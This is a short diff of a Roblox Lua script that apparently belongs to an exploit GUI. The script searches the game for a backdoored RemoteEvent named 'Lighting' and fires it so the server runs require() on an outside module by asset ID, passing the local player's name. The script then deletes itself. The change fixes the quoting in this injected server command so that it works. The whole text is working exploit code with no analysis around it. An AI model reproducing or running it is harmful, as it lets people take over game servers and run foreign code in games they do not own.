@@ -14,7 +14,7 @@ local function WTBITG_fake_script() -- ScreenGui.LocalScript
 
     for i,v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") and v.Name == "Lighting" then
-            v:FireServer("require(11183244198):s(".."'".."sugma".."'"..","..game.Players.LocalPlayer.Name..")", "Lightsource1", "Lightsource2")
+            v:FireServer("require(11183244198):s(".."'".."sugma".."'"..",".. "'" ..game.Players.LocalPlayer.Name.. "'"..")", "Lightsource1", "Lightsource2")
         end
     end
     script.Parent:Destroy()
